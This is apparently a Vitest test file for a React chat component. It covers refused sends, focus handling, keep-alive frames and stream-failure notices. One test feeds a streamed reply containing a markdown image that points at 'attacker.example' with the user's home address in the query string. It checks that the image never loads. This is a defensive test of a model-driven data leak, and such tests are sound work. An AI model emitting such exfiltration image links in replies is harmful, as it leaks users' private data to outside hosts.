import { LocalLlmGenerationError } from '@ci/common';
import { fireEvent, screen, waitFor } from '@testing-library/react';
import { describe, expect, it, vi } from 'vitest';

import { renderWithProviders } from '@/test/renderWithProviders';

import { Chat } from './Chat';
import { Channel, FrameEncoder } from './utils';

vi.mock('@/components/ModelSelector', () => ({
  ModelSelector: () => <div data-testid="model-selector" />,
  ToolsOffNotice: () => <div data-testid="tools-off-notice" />,
}));

const uploadState = vi.hoisted(() => ({ loading: false }));

vi.mock('@/api/useUploadFile', () => ({
  useUploadFile: () => [
    { files: [], loading: uploadState.loading, error: null },
    { upload: vi.fn(), reset: vi.fn() },
  ],
}));

describe('Chat', () => {
  it('shows the empty state when there are no messages', () => {
    const { getByText } = renderWithProviders(<Chat emptyState={<div>Start the conversation</div>} />);

    expect(getByText('Start the conversation')).toBeInTheDocument();
  });

  it('renders provided messages and hides the empty state', () => {
    const { getByText, queryByText } = renderWithProviders(
      <Chat
        emptyState={<div>Start the conversation</div>}
        messages={[
          { role: 'user', content: 'hi there' },
          { role: 'assistant', content: 'hello back' },
        ]}
      />,
    );

    expect(getByText('hi there')).toBeInTheDocument();
    expect(getByText('hello back')).toBeInTheDocument();
    expect(queryByText('Start the conversation')).not.toBeInTheDocument();
  });

  it('keeps the mobile transcript inside a rounded, inset scrolling surface', () => {
    const { container } = renderWithProviders(
      <Chat messages={[{ role: 'assistant', content: 'hello back' }]} />,
    );

    expect(container.querySelector('[data-list-scroll]')).toHaveClass(
      'overflow-y-auto',
      'overscroll-contain',
      'rounded-2xl',
      'mx-2',
      'device:rounded-none',
    );
  });

  it('shows the user bubble immediately, even if onSubmit has not resolved', async () => {
    const onSubmit = vi.fn(() => new Promise<boolean>(() => undefined));
    const { getByText, getByRole } = renderWithProviders(<Chat onSubmit={onSubmit} />);

    const textarea = getByRole('textbox');
    fireEvent.change(textarea, { target: { value: 'what is up' } });
    fireEvent.keyDown(textarea, { key: 'Enter' });

    await waitFor(() => expect(getByText('what is up')).toBeInTheDocument());
  });

  /**
   * A refused send leaves its text in the composer (ChatInput only clears on `true`), so the transcript must not
   * also claim it was sent: each refused try added a user bubble with no reply, two tries gave two bubbles.
   */
  describe('a refused send', () => {
    // The composer's own text node would match too — React mirrors a textarea's value into its default value.
    const bubbles = (text: string) => screen.queryAllByText(text, { ignore: 'textarea, script, style' });

    const typeAndSend = (text: string) => {
      const textbox = screen.getByRole('textbox');

      fireEvent.change(textbox, { target: { value: text } });
      fireEvent.keyDown(textbox, { key: 'Enter' });
    };

    it('shows the bubble while the send is still pending', async () => {
      renderWithProviders(<Chat onSubmit={() => new Promise<boolean>(() => undefined)} />);

      typeAndSend('what is up');

      await waitFor(() => expect(bubbles('what is up')).toHaveLength(1));
    });

    it('takes its user bubble back, and the empty state returns with it', async () => {
      const onSubmit = vi.fn().mockResolvedValue(false);

      renderWithProviders(<Chat onSubmit={onSubmit} emptyState={<div>Start the conversation</div>} />);
      typeAndSend('what is up');

      await waitFor(() => expect(onSubmit).toHaveBeenCalledTimes(1));
      await waitFor(() => expect(bubbles('what is up')).toHaveLength(0));
      expect(screen.getByText('Start the conversation')).toBeInTheDocument();
      // Still in the box, so it can be fixed and sent again.
      expect(screen.getByRole('textbox')).toHaveValue('what is up');
    });

    it('leaves no bubble however many times it is tried', async () => {
      const onSubmit = vi.fn().mockResolvedValue(false);

      renderWithProviders(<Chat onSubmit={onSubmit} />);

      typeAndSend('try again');
      await waitFor(() => expect(onSubmit).toHaveBeenCalledTimes(1));
      await waitFor(() => expect(bubbles('try again')).toHaveLength(0));

      typeAndSend('try again!');
      await waitFor(() => expect(onSubmit).toHaveBeenCalledTimes(2));
      await waitFor(() => expect(bubbles('try again!')).toHaveLength(0));
    });

    it('shows exactly one bubble once the retry is accepted', async () => {
      const onSubmit = vi.fn().mockResolvedValueOnce(false).mockResolvedValue(true);

      renderWithProviders(<Chat onSubmit={onSubmit} />);

      typeAndSend('hello');
      await waitFor(() => expect(onSubmit).toHaveBeenCalledTimes(1));
      await waitFor(() => expect(bubbles('hello')).toHaveLength(0));

      typeAndSend('hello!');
      await waitFor(() => expect(onSubmit).toHaveBeenCalledTimes(2));
      await waitFor(() => expect(bubbles('hello!')).toHaveLength(1));
      expect(bubbles('hello')).toHaveLength(0);
    });

    it('keeps the bubble of an accepted send', async () => {
      const onSubmit = vi.fn().mockResolvedValue(true);

      renderWithProviders(<Chat onSubmit={onSubmit} />);
      typeAndSend('what is up');

      await waitFor(() => expect(onSubmit).toHaveBeenCalledTimes(1));
      await new Promise((resolve) => setTimeout(resolve, 20));
      expect(bubbles('what is up')).toHaveLength(1);
    });
  });

  it('never loads a remote image while a reply streams in', async () => {
    // The live reply is painted by the streaming renderer, not by Markdown, so
    // Markdown's own image rule never saw it. The URL arrives split across
    // frames, the way a model's tokens do.
    const src = 'https://attacker.example/log?d=home+address';
    const reply = `Here you go. ![](${src})`;
    const encoder = new FrameEncoder();
    const readable = new ReadableStream<Uint8Array>({
      start(controller) {
        for (const piece of [reply.slice(0, 20), reply.slice(20, 40), reply.slice(40)]) {
          controller.enqueue(encoder.encodeFrame(Channel.TEXT, piece));
        }

        controller.close();
      },
    });

    const { container } = renderWithProviders(
      <Chat messages={[{ role: 'user', content: 'where do I live?' }]} readable={readable} />,
    );

    await waitFor(() => expect(container.querySelector('a[data-remote-image]')).toHaveAttribute('href', src));
    expect(container.querySelector('img')).toBeNull();
  });

  it("skips the server's keep-alive frames, before the reply and between its tokens", async () => {
    // Sent so a proxy that holds the headers until the first body byte lets the reply stream.
    const warn = vi.spyOn(console, 'warn').mockImplementation(() => {});
    const encoder = new FrameEncoder();
    const readable = new ReadableStream<Uint8Array>({
      start(controller) {
        controller.enqueue(encoder.encodeFrame(Channel.KEEPALIVE, ''));
        controller.enqueue(encoder.encodeFrame(Channel.TEXT, 'Hello '));
        controller.enqueue(encoder.encodeFrame(Channel.KEEPALIVE, ''));
        controller.enqueue(encoder.encodeFrame(Channel.TEXT, 'there.\n\n'));
        controller.close();
      },
    });

    const { container } = renderWithProviders(
      <Chat messages={[{ role: 'user', content: 'hi' }]} readable={readable} />,
    );

    await waitFor(() => expect(container.textContent).toContain('Hello there.'));
    expect(warn).not.toHaveBeenCalledWith('Ignored unsupported chunk channel:', expect.anything());
    warn.mockRestore();
  });

  /**
   * A turn whose stream dies — the on-device model failing right after a tool call was the case that motivated this.
   * The notice always says the reply is incomplete; it adds the reason only when the failure carries one.
   */
  describe('a reply whose stream dies', () => {
    const dying = (error: unknown) =>
      new ReadableStream<Uint8Array>({
        start(controller) {
          controller.error(error);
        },
      });

    const renderDying = (error: unknown) => {
      // Chat logs the failure for whoever has the console open; the log is not what is under test.
      vi.spyOn(console, 'error').mockImplementation(() => undefined);

      return renderWithProviders(
        <Chat messages={[{ role: 'user', content: 'search my memory' }]} readable={dying(error)} />,
      );
    };

    it('keeps the generic wording, and adds nothing, for a failure with no reason of its own', async () => {
      renderDying(new Error('socket hang up'));

      expect(await screen.findByText(/The response stream was interrupted/)).toBeInTheDocument();
      expect(screen.queryByText(/Reason:/)).not.toBeInTheDocument();
      // An arbitrary error's text is not the user's business: only a native model failure is explained.
      expect(screen.queryByText(/socket hang up/)).not.toBeInTheDocument();
    });

    it('says why an on-device turn failed, under the generic wording', async () => {
      renderDying(
        new LocalLlmGenerationError(
          'Generation failed: Invalid response from native layer: Input token ids are too long.',
        ),
      );

      expect(await screen.findByText(/The response stream was interrupted/)).toBeInTheDocument();
      expect(
        screen.getByText('Reason: Invalid response from native layer: Input token ids are too long.'),
      ).toBeInTheDocument();
    });

    it('keeps the generic wording alone when the on-device failure had no reason to give', async () => {
      renderDying(new LocalLlmGenerationError('Generation failed'));

      expect(await screen.findByText(/The response stream was interrupted/)).toBeInTheDocument();
      expect(screen.queryByText(/Reason:/)).not.toBeInTheDocument();
    });
  });

  /**
   * The textarea is disabled while a turn loads and streams, which drops focus to <body>. The focus calls made when
   * the stream finished ran while it was still disabled. After a reply the box had no focus, so the next message
   * needed a click first.
   */
  describe('focus after a reply', () => {
    const nextFrame = () => new Promise((resolve) => requestAnimationFrame(() => resolve(undefined)));
    const reply = [
      { role: 'user', content: 'hi there' },
      { role: 'assistant', content: 'hello back' },
    ];

    it('gives the box focus back once the reply has finished and the box is enabled again', async () => {
      const { rerender } = renderWithProviders(<Chat autoFocus loading />);
      const textbox = screen.getByRole('textbox');
      await nextFrame();

      // The finished reply lands while `streaming` is still set, so the box is still disabled when the mount and
      // `messages` focus calls run. They do nothing.
      rerender(<Chat autoFocus streaming messages={reply} />);
      expect(textbox).toBeDisabled();
      await nextFrame();
      expect(textbox).not.toHaveFocus();

      rerender(<Chat autoFocus messages={reply} />);

      await waitFor(() => expect(textbox).toHaveFocus());
    });

    it('gives it back again after a later disable, such as a thread refetch', async () => {
      const { rerender } = renderWithProviders(<Chat autoFocus messages={reply} />);
      const textbox = screen.getByRole('textbox');
      await waitFor(() => expect(textbox).toHaveFocus());

      // What a browser does when the control is disabled (jsdom cannot blur a disabled control, so blur first).
      textbox.blur();
      rerender(<Chat autoFocus disabled messages={reply} />);
      expect(textbox).not.toHaveFocus();
      rerender(<Chat autoFocus messages={reply} />);

      await waitFor(() => expect(textbox).toHaveFocus());
    });

    it('leaves focus where the person moved it while the reply streamed', async () => {
      const { rerender } = renderWithProviders(
        <>
          <button type="button">Elsewhere</button>
          <Chat autoFocus streaming />
        </>,
      );
      const elsewhere = screen.getByRole('button', { name: 'Elsewhere' });
      // Let the mount-time focus attempt run first; it is not what is under test.
      await nextFrame();
      elsewhere.focus();

      rerender(
        <>
          <button type="button">Elsewhere</button>
          <Chat autoFocus />
        </>,
      );

      await nextFrame();
      expect(elsewhere).toHaveFocus();
    });

    it('gives it back after a file upload, which disables the box too', async () => {
      const { rerender } = renderWithProviders(<Chat autoFocus messages={reply} />);
      const textbox = screen.getByRole('textbox');
      await waitFor(() => expect(textbox).toHaveFocus());

      textbox.blur();

      try {
        uploadState.loading = true;
        rerender(<Chat autoFocus messages={reply} />);
        expect(textbox).toBeDisabled();
      } finally {
        uploadState.loading = false;
      }

      rerender(<Chat autoFocus messages={reply} />);

      await waitFor(() => expect(textbox).toHaveFocus());
    });

    it('does nothing without autoFocus', async () => {
      const { rerender } = renderWithProviders(<Chat streaming />);
      const textbox = screen.getByRole('textbox');

      rerender(<Chat />);

      await nextFrame();
      expect(textbox).not.toHaveFocus();
    });
  });

  it('submits a typed message through ChatInput', async () => {
    const onSubmit = vi.fn().mockReturnValue(true);
    const { getByRole } = renderWithProviders(<Chat onSubmit={onSubmit} />);

    const textarea = getByRole('textbox');
    fireEvent.change(textarea, { target: { value: 'what is up' } });
    fireEvent.keyDown(textarea, { key: 'Enter' });

    await waitFor(() =>
      expect(onSubmit).toHaveBeenCalledWith(
        expect.objectContaining({ message: 'what is up' }),
        expect.anything(),
      ),
    );
  });
});
